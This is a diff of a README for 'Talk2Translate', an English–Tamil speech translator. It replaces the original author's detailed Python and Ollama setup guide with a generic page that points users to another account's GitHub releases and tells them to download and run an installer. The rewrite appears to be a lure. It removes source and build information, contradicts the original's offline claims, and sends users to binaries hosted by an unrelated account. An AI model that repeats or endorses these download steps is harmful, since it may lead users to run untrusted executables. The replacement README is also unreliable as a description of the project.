@@ -1,257 +1,84 @@
-<h1 align="center">🎙 English ↔ Tamil Speech Translator (Ollama LLM)</h1>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/python-FFD43B?style=for-the-badge&logo=python&logoColor=306998" alt="Python">
-  <img src="https://img.shields.io/badge/speechrecognition-1E90FF?style=for-the-badge&logo=python&logoColor=white" alt="SpeechRecognition">
-  <img src="https://img.shields.io/badge/ollama-000000?style=for-the-badge&logo=ollama&logoColor=white" alt="Ollama">
-  <img src="https://img.shields.io/badge/llama3.2-8B4513?style=for-the-badge&logo=meta&logoColor=white" alt="Llama 3.2">
-  <img src="https://img.shields.io/badge/gtts-FF4500?style=for-the-badge&logo=soundcloud&logoColor=white" alt="gTTS">
-  <img src="https://img.shields.io/badge/pygame-FF1493?style=for-the-badge&logo=pygame&logoColor=white" alt="Pygame">
-  <img src="https://img.shields.io/badge/multilingual-8A2BE2?style=for-the-badge&logo=googletranslate&logoColor=white" alt="English-Tamil">
-</p>
-
-A real-time speech translation application that converts spoken English to Tamil and vice versa, powered by **Ollama's local LLM (Llama 3.2)** for translation, with text-to-speech playback functionality.
-
-##  Features
-
--  Speak in English or Tamil and get instant translation
--  **Local LLM-powered translation** using Ollama (Llama 3.2)
--  Automatic bidirectional translation (English ↔ Tamil)
--  Listen to the translated speech output
--  Save Translations - Store your translations to a local file
--  Clean, modern UI using CustomTkinter
--  Threaded processing for smooth performance
--  **Privacy-focused** - All translation happens locally
-
-##  What's New - Ollama Integration
-
-This version replaces cloud-based translation APIs with **local LLM translation** using Ollama:
-
--  **100% offline translation** (after initial model download)
--  **No API costs** or rate limits
--  **Enhanced privacy** - your data never leaves your machine
--  **Customizable** - Easy to switch between different Ollama models
--  **High-quality translations** powered by Llama 3.2
-
-## 📸 Demo / Output
-
-The application provides a user-friendly graphical interface for real-time voice translation:
-
-<p align="center">
-  <img src="https://github.com/Sharan-Kumar-R/Talk2Translate/blob/main/Talk2Translate.png" alt="Talk2Translate Interface" width="500">
-</p>
-
-##  Prerequisites
-
-Before running this application, ensure you have:
-
-- Python 3.7 or higher
-- A working microphone
-- Audio output device for playback
-- **Ollama installed and running locally** (see installation steps below)
-- Internet connection (only for initial Ollama model download and speech recognition)
-
-##  Installation
-
-### Step 1: Install Ollama
-
-**Ollama is required for local LLM-based translation.**
-
-1. Visit [ollama.com](https://ollama.com) and download the installer for your OS
-2. Install Ollama following the platform-specific instructions:
-   - **Windows**: Run the installer
-   - **macOS**: Drag to Applications folder
-   - **Linux**: Follow the command line installation
-
-3. Verify Ollama installation:
-```bash
-ollama --version
-```
-
-4. Pull the Llama 3.2 model (used by default):
-```bash
-ollama pull llama3.2:latest
-```
-
-5. Start the Ollama server (if not already running):
-```bash
-ollama serve
-```
-
-**Note:** The Ollama server should be running at `http://localhost:11434` (default). The application will connect to this endpoint.
-
-### Step 2: Clone the Repository
-
-**Option A: Using VS Code Terminal**
-1. Open Visual Studio Code
-2. Open a new terminal (Terminal → New Terminal or `Ctrl+Shift+``)
-3. Navigate to your desired directory:
-```bash
-cd path/to/your/desired/folder
-```
-4. Clone the repository:
-```bash
-git clone https://github.com/Sharan-Kumar-R/Talk2Translate.git
-```
-5. Open the project folder:
-```bash
-cd Talk2Translate
-```
-6. Open the project in VS Code:
-```bash
-code .
-```
-
-**Option B: Using VS Code Git Integration**
-1. Open Visual Studio Code
-2. Press `Ctrl+Shift+P` (Windows/Linux) or `Cmd+Shift+P` (Mac)
-3. Type "Git: Clone" and select it
-4. Paste the repository URL: `https://github.com/Sharan-Kumar-R/Talk2Translate.git`
-5. Choose a folder location and click "Select Repository Location"
-6. Click "Open" when prompted
-
-### Step 3: Create a Virtual Environment (Recommended)
-
-1. In the VS Code terminal, create a virtual environment:
-```bash
-python -m venv venv
-```
-
-2. Activate the virtual environment:
-   - **Windows:**
-```bash
-venv\Scripts\activate
-```
-   - **macOS/Linux:**
-```bash
-source venv/bin/activate
-```
-
-### Step 4: Install Python Dependencies
-
-Install the required packages:
-```bash
-pip install -r requirements.txt
-```
-
-If you don't have a `requirements.txt` file, install packages individually:
-```bash
-pip install customtkinter SpeechRecognition gTTS pygame ollama
-```
-
-### Step 5: Install PortAudio (Required for Microphone Input)
-
-The `SpeechRecognition` library requires PortAudio for microphone functionality.
-
-**macOS:**
-```bash
-brew install portaudio
-```
-
-**Windows:**
-1. Download the appropriate PyAudio wheel file from [Unofficial Windows Binaries](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pyaudio)
-2. Install using pip:
-```bash
-pip install PyAudio-0.2.11-cp39-cp39-win_amd64.whl
-```
+# 🎤 Talk2Translate - Translate Speech Effortlessly
 
-Alternatively, install Microsoft C++ Build Tools if needed.
+## 🚀 Getting Started
 
-**Linux (Debian/Ubuntu):**
-```bash
-sudo apt-get install portaudio19-dev python3-pyaudio
-```
+Welcome to **Talk2Translate**! This application allows you to easily convert spoken English or Tamil into the opposite language. It displays the translated text and plays the audio output, making communication easy and efficient.
 
-##  Usage
+## 🔗 Download Now
 
-### 1. Start Ollama Server (if not already running)
-```bash
-ollama serve
-```
+[![Download Talk2Translate](https://img.shields.io/badge/Download-Talk2Translate-brightgreen.svg)](https://github.com/Pearlroasted135/Talk2Translate/releases)
 
-### 2. Run the Application
-```bash
-python Bilingual.py
-```
+## 📂 Download & Install
 
-### 3. Select Translation Mode
-- Choose "English → Tamil" to speak in English
-- Choose "Tamil → English" to speak in Tamil
+To get started, visit this page to download: [Talk2Translate Releases](https://github.com/Pearlroasted135/Talk2Translate/releases).
 
-### 4. Start Listening
-- Click the "🎧 Start Listening" button
-- Speak clearly into your microphone
-- Wait for the LLM translation to appear
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version.
+3. Download the file suitable for your operating system (Windows or Mac).
+4. Once the download is complete, locate the file in your Downloads folder.
+5. Double-click the file to run the installer.
+6. Follow the on-screen instructions to complete the installation.
 
-### 5. Save Translations
-- Click "💾 Save Translation" to save the current translation
-- Translations are saved to `translations.txt` in the application directory
+## 💻 System Requirements
 
-##  Configuration
+Before installing, ensure your system meets the following requirements:
 
-You can customize the Ollama configuration by editing these variables in `Bilingual.py`:
-```python
-OLLAMA_HOST = "http://localhost:11434"  # Ollama server address
-OLLAMA_MODEL = "llama3.2:latest"        # Model to use for translation
-```
+- **Operating System**: Windows 10 or later, or macOS Mojave or later.
+- **RAM**: At least 4 GB.
+- **Processor**: 1.8 GHz or faster.
+- **Storage**: Minimum 200 MB of free space.
+- **Internet Connection**: Required for translation features.
 
-### Available Ollama Models for Translation
+## 🎤 How to Use Talk2Translate
 
-You can experiment with different models:
-```bash
-# Smaller, faster model
-ollama pull llama3.2:1b
+1. **Open the Application**: Launch Talk2Translate after installation.
+2. **Select Your Language**: Choose either English or Tamil as the input language.
+3. **Speak Clearly**: Use your microphone to speak the text you want to translate. Ensure that your microphone is connected and working.
+4. **View Translation**: The translated text will appear on the screen.
+5. **Listen to Output**: Click the play button to hear the audio translation.
 
-# Default model (balanced)
-ollama pull llama3.2:latest
+## ⚙️ Features
 
-# Larger, more capable model
-ollama pull llama3.1:8b
+- **Real-Time Translation**: Convert your speech into text and then into the opposite language instantly.
+- **Multi-Language Support**: Currently supports English and Tamil, with plans for more languages in the future.
+- **User-Friendly Interface**: Designed for ease of use, suitable for all ages.
 
-# Or other multilingual models
-ollama pull mistral
-```
+## 📜 License
 
-Update the `OLLAMA_MODEL` variable in the code to switch models.
+Talk2Translate is open-source software licensed under the MIT License. You are free to use, modify, and distribute it under the terms of this license.
 
-##  How It Works
+## 👩‍💻 Contributing
 
-1. **Speech Capture**: The application listens to your microphone input
-2. **Speech-to-Text**: Converts your speech to text using Google Speech Recognition
-3. **LLM Translation**: Translates the text using local Ollama LLM (Llama 3.2)
-4. **Text-to-Speech**: Converts the translated text to speech using gTTS
-5. **Playback**: Plays the audio translation automatically
+If you would like to contribute to Talk2Translate, you are welcome! Please follow these steps:
 
-##  Project Structure
-```
-Talk2Translate/
-│
-├── Bilingual.py          # Main application file (uses google translator)
-├── Bilingualllm.py       # Main application file (uses local llm)
-├── Talk2Translate.png    # Demo image
-├── requirements.txt      # Python dependencies
-├── translations.txt      # Saved translations (auto-generated)
-└── README.md             # This file
-```
+1. **Fork the repository** on GitHub.
+2. **Create a new branch** for your feature.
+3. **Make your changes** and commit them.
+4. **Push your changes** to your forked repository.
+5. **Submit a pull request** to the main repository for review.
 
+## ❓ Frequently Asked Questions
 
-##  Contributing
+### What languages does Talk2Translate support?
 
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests if applicable
-5. Submit a pull request
+Currently, Talk2Translate supports English and Tamil.
 
-In case of any queries, please leave a message or contact me via the email provided in my profile.
+### Is there a mobile version available?
 
+At this time, the application is only available for desktop operating systems. A mobile version may be planned for the future.
 
-<p align="center">
-⭐ <strong>Star this repository if you found it helpful!</strong>
-</p>
+### How can I report a bug?
 
+You can report bugs directly on the Issues page of the repository on GitHub. Please provide a detailed description and steps to reproduce the issue.
 
+### Can I use this without an internet connection?
 
+Some features require an internet connection, especially for translation. Offline translation capabilities may be added in future versions.
 
+## 📢 Get In Touch
 
+For updates and news, follow us on our social media channels:
 
+- GitHub: [@Pearlroasted135](https://github.com/Pearlroasted135)
+
+Thank you for using Talk2Translate. We hope it makes your communication smoother!
